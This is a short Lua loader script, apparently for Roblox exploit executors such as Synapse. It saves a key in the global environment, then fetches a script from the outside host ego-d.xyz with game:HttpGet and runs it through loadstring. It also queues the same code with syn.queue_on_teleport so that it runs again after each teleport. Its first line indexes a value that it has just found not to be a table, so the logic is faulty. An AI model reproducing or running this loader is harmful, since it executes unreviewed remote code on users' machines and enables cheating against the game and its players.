if type(Setting) ~= 'table' then Setting[1] = getgenv().Key end
print(Setting[1])
local buoi = [[
getgenv().Key = "]].. Setting[1]..'"'..[[
local Exploit = secure_load and "Sentinel" or syn and "Synapse"
loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
]]

syn.queue_on_teleport(buoi)
